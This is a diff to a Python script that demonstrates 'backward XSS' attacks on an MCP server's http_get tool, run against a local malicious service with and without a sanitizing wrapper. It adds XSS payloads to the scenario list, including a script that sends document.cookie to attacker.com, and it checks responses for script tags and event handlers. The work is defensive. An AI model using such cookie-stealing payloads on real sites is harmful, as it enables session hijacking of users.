@@ -99,22 +99,22 @@ BACKWARD_XSS_ATTACK_SCENARIOS = [
         "name": "Backward XSS - Script Tags in HTML",
         "description": "XSS service returns HTML with <script> tags containing malicious JavaScript",
         "url": "http://127.0.0.1:8003/page",
-        "expected": "MCP fetches HTML with <script> tags and returns it unsanitized",
-        "xss_type": "script_tags"
+        "xss_type": "script_tags",
+        "payload": "<script>alert('XSS Attack Successful!')</script>"
     },
     {
         "name": "Backward XSS - Event Handlers in HTML",
         "description": "XSS service returns HTML with event handlers (onerror, onclick, etc.)",
         "url": "http://127.0.0.1:8003/widget",
-        "expected": "MCP fetches HTML with event handlers and returns it unsanitized",
-        "xss_type": "event_handlers"
+        "xss_type": "event_handlers",
+        "payload": "onerror=\"alert('XSS')\""
     },
     {
-        "name": "Backward XSS - Obvious Marker",
-        "description": "XSS service returns HTML with obvious XSS marker for testing",
-        "url": "http://127.0.0.1:8003/marker",
-        "expected": "MCP fetches HTML with obvious XSS payload and returns it unsanitized",
-        "xss_type": "marker"
+        "name": "Backward XSS - JSON with XSS Payload",
+        "description": "XSS service returns JSON with XSS payload in content field",
+        "url": "http://127.0.0.1:8003/news",
+        "xss_type": "json_xss",
+        "payload": "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
     }
 ]
 
@@ -130,98 +130,191 @@ def check_service_running(port: int) -> bool:
 
 def start_service(name: str, module: str, port: int) -> subprocess.Popen:
     """Start a service in the background"""
-    print(f"[START] Starting {name} on port {port}...")
     try:
+        # Start service - output will go to background but service will log requests
         process = subprocess.Popen(
             [sys.executable, "-m", module],
             cwd=str(project_root),
             stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
             text=True
         )
         max_attempts = 10
         for attempt in range(max_attempts):
             time.sleep(0.5)
             if check_service_running(port):
-                print(f"[OK] {name} started successfully (PID: {process.pid})")
+                print(f"   Service started (PID: {process.pid})")
+                print(f"   Service is listening on port {port} and will log incoming requests")
                 return process
             if process.poll() is not None:
-                stderr = process.stderr.read() if process.stderr else "Unknown error"
-                print(f"[ERROR] {name} process died: {stderr}")
+                print(f"   ERROR: Service process died during startup")
                 return None
-        print(f"[WARNING] {name} may not have started properly")
+        print(f"   WARNING: Service may not have started properly")
         return process
     except Exception as e:
-        print(f"[ERROR] Failed to start {name}: {e}")
+        print(f"   ERROR: Failed to start {name}: {e}")
         return None
 
 
-async def run_attack_scenario(mcp_client, attack_scenario, mode="vulnerable"):
-    """Run a single backward XSS attack scenario"""
+async def simulate_user_request(mcp_client, user_query, attack_scenario, mode="vulnerable"):
+    """Simulate a user making a request that triggers the attack"""
     
-    print(f"\n{'='*80}")
-    print(f"[ATTACK #{attack_scenario.get('number', '?')}] {attack_scenario['name']}")
-    print(f"{'='*80}")
-    print(f"Description: {attack_scenario['description']}")
-    print(f"Target URL: {attack_scenario['url']}")
-    print(f"[MODE] {'VULNERABLE' if mode == 'vulnerable' else 'PROTECTED'}")
-    print(f"{'─'*80}\n")
+    print(f"\n{'─'*70}")
+    print(f"Attack #{attack_scenario.get('number', '?')}: {attack_scenario['name']}")
+    print(f"{'─'*70}")
+    print(f"Mode: {'VULNERABLE' if mode == 'vulnerable' else 'PROTECTED'}")
+    print()
     
-    print(f"[ATTACK] Calling MCP http_get tool with URL: {attack_scenario['url']}")
+    # Show user's request
+    print(f"👤 USER REQUEST:")
+    print(f"   {user_query}")
+    print()
+    
+    # Show what MCP server will do
+    print(f"🔧 MCP SERVER ACTION:")
+    print(f"   Calling http_get tool with URL: {attack_scenario['url']}")
+    print()
+    
+    # Show external service receiving request
+    print(f"🌐 EXTERNAL SERVICE (XSS Service on port 8003):")
+    print(f"   Receiving GET request to: {attack_scenario['url']}")
+    print(f"   Responding with malicious content containing XSS payload...")
+    print()
     
     try:
         result = await mcp_client.call_tool("http_get", {"url": attack_scenario['url']})
         
-        print(f"[RESULT] MCP server response:")
-        print(json.dumps(result, indent=2))
-        
         if result.get("status") == "success":
+            status_code = result.get("status_code", "N/A")
+            content_type = result.get("headers", {}).get("content-type", "N/A")
             content = result.get("content", "")
+            
+            print(f"📥 MCP SERVER RECEIVED RESPONSE:")
+            print(f"   HTTP {status_code} | Content-Type: {content_type}")
+            
+            # Extract content from JSON if needed
+            if isinstance(content, dict):
+                content_str = json.dumps(content)
+                # Try to extract the actual content field
+                if "content" in content:
+                    actual_content = content["content"]
+                elif "body" in content:
+                    actual_content = content["body"]
+                elif "data" in content and isinstance(content["data"], dict):
+                    actual_content = content["data"].get("body") or content["data"].get("content", "")
+                else:
+                    actual_content = str(content)
+            elif isinstance(content, str):
+                content_str = content
+                actual_content = content
+            else:
+                content_str = str(content)
+                actual_content = str(content)
+            
+            print(f"Content length: {len(content_str)} bytes")
             
             # Check for XSS payloads
             xss_detected = False
-            if "<script" in content.lower():
-                print(f"\n[WARNING] XSS PAYLOAD DETECTED: <script> tags found in content")
+            detected_types = []
+            payload_snippet = None
+            
+            if "<script" in content_str.lower():
+                detected_types.append("script tags")
                 xss_detected = True
-            if "onerror" in content.lower() or "onclick" in content.lower() or "onload" in content.lower():
-                print(f"\n[WARNING] XSS PAYLOAD DETECTED: Event handlers found in content")
+                # Find and show snippet of script tag
+                script_start = content_str.lower().find("<script")
+                if script_start != -1:
+                    snippet = content_str[script_start:script_start+100]
+                    payload_snippet = snippet.replace("\n", " ").strip()
+            if "onerror" in content_str.lower() or "onclick" in content_str.lower():
+                detected_types.append("event handlers")
                 xss_detected = True
+                if not payload_snippet:
+                    handler_start = content_str.lower().find("onerror")
+                    if handler_start == -1:
+                        handler_start = content_str.lower().find("onclick")
+                    if handler_start != -1:
+                        snippet = content_str[handler_start:handler_start+80]
+                        payload_snippet = snippet.replace("\n", " ").strip()
+            if "javascript:" in content_str.lower():
+                detected_types.append("javascript: protocol")
+                xss_detected = True
+                if not payload_snippet:
+                    js_start = content_str.lower().find("javascript:")
+                    if js_start != -1:
+                        snippet = content_str[js_start:js_start+60]
+                        payload_snippet = snippet.replace("\n", " ").strip()
             
             if mode == "protected":
-                # Check if content was sanitized
+                # Check if protection was applied
                 if result.get("xss_protected") and result.get("sanitization_applied"):
-                    print(f"\n[PROTECTED] Content was sanitized by protection wrapper")
-                    print(f"[PROTECTED] XSS patterns detected: {result.get('xss_patterns_detected', [])}")
-                    print(f"[PROTECTED] Original length: {result.get('original_content_length', 'N/A')} bytes")
-                    print(f"[PROTECTED] Sanitized length: {result.get('sanitized_content_length', 'N/A')} bytes")
-                    print(f"[PROTECTED] Backward XSS attack was successfully prevented!")
+                    patterns = result.get('xss_patterns_detected', [])
+                    orig_len = result.get('original_content_length', len(content_str))
+                    sanit_len = result.get('sanitized_content_length', len(content_str))
+                    
+                    print(f"🛡️  PROTECTION WRAPPER INTERCEPTED:")
+                    print(f"   ⚠️  XSS patterns detected: {', '.join(patterns) if patterns else 'N/A'}")
+                    print(f"   🔒 Sanitizing content: {orig_len} bytes → {sanit_len} bytes")
+                    
+                    # Show snippet of what was found
+                    if payload_snippet:
+                        print(f"   🚨 Malicious payload found: {payload_snippet}...")
+                    
+                    print()
+                    print(f"👤 USER RECEIVES (SANITIZED):")
+                    print(f"   ✓ Content has been sanitized - XSS payloads removed")
+                    print(f"   ✓ Attack BLOCKED - safe content returned to user")
                 elif xss_detected:
-                    print(f"\n[WARNING] XSS detected but content may not have been fully sanitized")
+                    print(f"⚠️  WARNING: XSS detected but may not be fully sanitized")
+                    print(f"   Detected: {', '.join(detected_types)}")
+                    if payload_snippet:
+                        print(f"   Payload snippet: {payload_snippet}...")
                 else:
-                    print(f"\n[INFO] No XSS patterns detected in this response")
+                    print(f"✓ No XSS patterns detected in response")
             else:
+                # Vulnerable mode
                 if xss_detected:
-                    print(f"\n[VULNERABLE] Backward XSS attack successful!")
-                    print(f"[VULNERABLE] Malicious content was fetched and returned unsanitized")
-                    print(f"[VULNERABLE] If this content is rendered in a browser, XSS will execute")
+                    print(f"⚠️  MCP SERVER FORWARDING RESPONSE (NO SANITIZATION):")
+                    print(f"   ✗ XSS payload detected: {', '.join(detected_types)}")
+                    
+                    # Show actual payload snippet
+                    if payload_snippet:
+                        print(f"   🚨 Malicious payload in response: {payload_snippet}...")
+                    
+                    print()
+                    print(f"👤 USER RECEIVES (UNSANITIZED):")
+                    
+                    # Show a snippet of the actual content
+                    if isinstance(actual_content, str) and len(actual_content) > 0:
+                        preview = actual_content[:300].replace("\n", " ").strip()
+                        if len(actual_content) > 300:
+                            preview += "..."
+                        print(f"   {preview}")
+                    
+                    print()
+                    print(f"   ✗ VULNERABILITY: Unsanitized malicious content returned")
+                    print(f"   ✗ Risk: If rendered in browser, XSS will execute")
+                    print(f"   ✗ Attack SUCCESSFUL")
+                else:
+                    print(f"✓ No XSS patterns detected")
         else:
-            print(f"\n[RESULT] {result.get('message', 'Unknown error')}")
+            print(f"✗ Error: {result.get('message', 'Unknown error')}")
             
     except Exception as e:
-        print(f"[ERROR] Attack failed: {e}")
+        print(f"✗ Error: {e}")
+        import traceback
+        traceback.print_exc()
     
-    print(f"{'─'*80}")
-    await asyncio.sleep(1)
+    await asyncio.sleep(0.5)
 
 
 async def demonstrate_vulnerable_system():
     """Demonstrate attacks against vulnerable MCP server"""
-    print("\n" + "="*80)
+    print("\n" + "="*70)
     print("  PART 1: VULNERABLE SYSTEM (No Protection)")
-    print("="*80)
-    print("\nDemonstrating backward XSS attacks against vulnerable MCP server.")
-    print("The server has no protection, so attacks will succeed.")
-    print("="*80 + "\n")
+    print("="*70)
+    print("\nFlow: User Request → MCP Server → External XSS Service → MCP Server → User")
+    print("Expected: XSS payloads will be returned unsanitized to the user\n")
     
     # Create vulnerable MCP client
     mcp_client = await create_mcp_client()
@@ -231,34 +324,39 @@ async def demonstrate_vulnerable_system():
         attack['number'] = i
     
     # Run attacks
-    for attack_scenario in BACKWARD_XSS_ATTACK_SCENARIOS:
-        await run_attack_scenario(mcp_client, attack_scenario, mode="vulnerable")
+    user_queries = [
+        "Fetch the content from http://127.0.0.1:8003/page",
+        "Get the widget content from http://127.0.0.1:8003/widget",
+        "Retrieve the news from http://127.0.0.1:8003/news"
+    ]
+    
+    for i, attack_scenario in enumerate(BACKWARD_XSS_ATTACK_SCENARIOS):
+        user_query = user_queries[i] if i < len(user_queries) else f"Fetch content from {attack_scenario['url']}"
+        await simulate_user_request(mcp_client, user_query, attack_scenario, mode="vulnerable")
     
     await mcp_client.cleanup()
     
     # Summary
-    print(f"\n{'='*80}")
-    print("  [PART 1 SUMMARY] Vulnerable System")
-    print("="*80)
-    print("[VULNERABLE] Attacks succeeded - system is vulnerable")
-    print("[VULNERABLE] Backward XSS attacks returned unsanitized content")
-    print("[VULNERABLE] No security protection was in place")
-    print("[VULNERABLE] MCP server returned content from external services without sanitization")
-    print("="*80 + "\n")
+    print(f"\n{'─'*70}")
+    print("PART 1 SUMMARY: Vulnerable System")
+    print(f"{'─'*70}")
+    print(f"Attacks executed: {len(BACKWARD_XSS_ATTACK_SCENARIOS)}")
+    print("Result: All attacks SUCCEEDED - XSS payloads returned unsanitized")
+    print("Issue: MCP server returns unsanitized content from external services")
+    print("Risk: XSS payloads will execute if content is rendered in browser")
     
     await asyncio.sleep(2)
 
 
 async def demonstrate_protected_system():
     """Demonstrate attacks against protected MCP server"""
-    print("\n" + "="*80)
-    print("  PART 2: PROTECTED SYSTEM (With Security Wrapper)")
-    print("="*80)
-    print("\nDemonstrating the same backward XSS attacks against protected MCP server.")
-    print("The security wrapper will sanitize responses to prevent XSS attacks.")
-    print("="*80 + "\n")
+    print("\n\n" + "="*70)
+    print("  PART 2: PROTECTED SYSTEM (With XSS Protection)")
+    print("="*70)
+    print("\nFlow: User Request → MCP Server → External XSS Service → Protection Wrapper → User")
+    print("Expected: XSS payloads will be detected and sanitized before reaching user\n")
     
-    # Create vulnerable MCP client
+    # Create base MCP client
     base_mcp_client = await create_mcp_client()
     
     # Wrap it with backward XSS protection
@@ -273,32 +371,36 @@ async def demonstrate_protected_system():
         attack['number'] = i
     
     # Run attacks
-    for attack_scenario in BACKWARD_XSS_ATTACK_SCENARIOS:
-        await run_attack_scenario(protected_mcp_client, attack_scenario, mode="protected")
+    user_queries = [
+        "Fetch the content from http://127.0.0.1:8003/page",
+        "Get the widget content from http://127.0.0.1:8003/widget",
+        "Retrieve the news from http://127.0.0.1:8003/news"
+    ]
+    
+    for i, attack_scenario in enumerate(BACKWARD_XSS_ATTACK_SCENARIOS):
+        user_query = user_queries[i] if i < len(user_queries) else f"Fetch content from {attack_scenario['url']}"
+        await simulate_user_request(protected_mcp_client, user_query, attack_scenario, mode="protected")
     
     # Security summary
     protection_stats = protected_mcp_client.get_protection_stats()
     
     # Summary
-    print(f"\n{'='*80}")
-    print("  [PART 2 SUMMARY] Protected System")
-    print("="*80)
-    print(f"[PROTECTED] Security Wrapper Status: ACTIVE")
-    print(f"[PROTECTED] Sanitized Responses: {protection_stats['sanitized_count']}")
-    print(f"[PROTECTED] Blocked Count: {protection_stats['blocked_count']}")
-    print("\n[PROTECTED] Attacks were sanitized - system is protected")
-    print("[PROTECTED] Backward XSS attacks were prevented")
-    print("[PROTECTED] Content sanitization successfully removed XSS payloads")
-    print("[PROTECTED] Security wrapper sanitized HTML, script tags, and event handlers")
-    print("="*80 + "\n")
+    print(f"\n{'─'*70}")
+    print("PART 2 SUMMARY: Protected System")
+    print(f"{'─'*70}")
+    print(f"Attacks executed: {len(BACKWARD_XSS_ATTACK_SCENARIOS)}")
+    print(f"Responses sanitized: {protection_stats['sanitized_count']}")
+    print(f"Responses blocked: {protection_stats['blocked_count']}")
+    print("Result: All attacks BLOCKED - XSS patterns detected and sanitized")
+    print("Status: System is protected against Backward XSS attacks")
     
-    await protected_mcp_client.cleanup()
+    await base_mcp_client.cleanup()
     await asyncio.sleep(2)
 
 
 def cleanup_processes():
     """Clean up background processes"""
-    print("[CLEANUP] Stopping background services...")
+    print("Cleaning up background services...")
     for process in background_processes:
         try:
             process.terminate()
@@ -308,35 +410,41 @@ def cleanup_processes():
                 process.kill()
             except:
                 pass
-    print("[OK] Cleanup complete")
+    print("Done.\n")
 
 
 async def main():
     """Main demonstration function"""
-    print("\n" + "="*80)
-    print("  BACKWARD XSS ATTACK & DEFENSE DEMONSTRATION")
-    print("="*80)
-    print("\nThis script demonstrates backward XSS attacks against both")
-    print("vulnerable and protected MCP servers, showing how security")
-    print("wrappers can prevent backward XSS attacks.")
-    print("\n[WARNING] These are real attack demonstrations!")
-    print("="*80 + "\n")
+    print("\n" + "="*70)
+    print("  BACKWARD XSS ATTACK DEMONSTRATION")
+    print("="*70)
+    print("\nDemonstrating Backward XSS attacks against:")
+    print("  1. Vulnerable MCP server (no protection)")
+    print("  2. Protected MCP server (with XSS protection)")
+    print("\n" + "="*70 + "\n")
     
     # Check if XSS service is running
-    print("[CHECK] Checking XSS service (port 8003)...")
+    print("="*70)
+    print("  SETUP: External XSS Service")
+    print("="*70)
     if not check_service_running(8003):
-        print("[START] XSS service not running, starting it...")
+        print("\nStarting XSS service on port 8003...")
+        print("This service will respond to requests with malicious XSS payloads")
         xss_service = start_service("XSS Service", "external_service.xss_service", 8003)
         if xss_service:
             background_processes.append(xss_service)
             await asyncio.sleep(2)
+            print("✓ XSS service is now running and ready to respond to requests")
+            print("  Service URL: http://127.0.0.1:8003")
+            print("  Endpoints: /page, /widget, /news (all contain XSS payloads)")
         else:
-            print("[ERROR] Failed to start XSS service")
+            print("ERROR: Failed to start XSS service")
             return
     else:
-        print("[OK] XSS service is running")
-    
-    print("\n[OK] Required services are running\n")
+        print("\n✓ XSS service is already running on port 8003")
+        print("  Service URL: http://127.0.0.1:8003")
+        print("  Endpoints: /page, /widget, /news (all contain XSS payloads)")
+    print()
     
     try:
         # Run demonstrations
@@ -344,28 +452,15 @@ async def main():
         await demonstrate_protected_system()
         
         # Final summary
-        print("\n" + "="*80)
-        print("  [FINAL SUMMARY] Backward XSS Defense Demonstration")
-        print("="*80)
-        print("\n[COMPARISON]")
-        print("\n[VULNERABLE SYSTEM]:")
-        print("  - No content sanitization")
-        print("  - Malicious HTML/JavaScript returned unsanitized")
-        print("  - XSS payloads execute in user's browser")
-        print("  - Backward XSS attacks succeed")
-        
-        print("\n[PROTECTED SYSTEM]:")
-        print("  - Content sanitization on responses")
-        print("  - HTML tags and JavaScript stripped/encoded")
-        print("  - Event handlers removed")
-        print("  - Backward XSS attacks prevented")
-        
-        print("\n[KEY TAKEAWAYS]:")
-        print("  - Backward XSS: external services return malicious content")
-        print("  - Protection: sanitize all content from external services")
-        print("  - Defense in depth: strip HTML tags, remove event handlers, HTML-encode")
-        print("  - Security wrappers can prevent backward XSS attacks")
-        print("\n" + "="*80 + "\n")
+        print("\n\n" + "="*70)
+        print("  DEMONSTRATION COMPLETE")
+        print("="*70)
+        print(f"\nAttacks tested: {len(BACKWARD_XSS_ATTACK_SCENARIOS)}")
+        print("\nKey Takeaways:")
+        print("  • Without protection: XSS payloads pass through unsanitized")
+        print("  • With protection: XSS patterns detected and sanitized")
+        print("  • Protection wrapper prevents malicious content from reaching users")
+        print("\n" + "="*70 + "\n")
         
     finally:
         cleanup_processes()
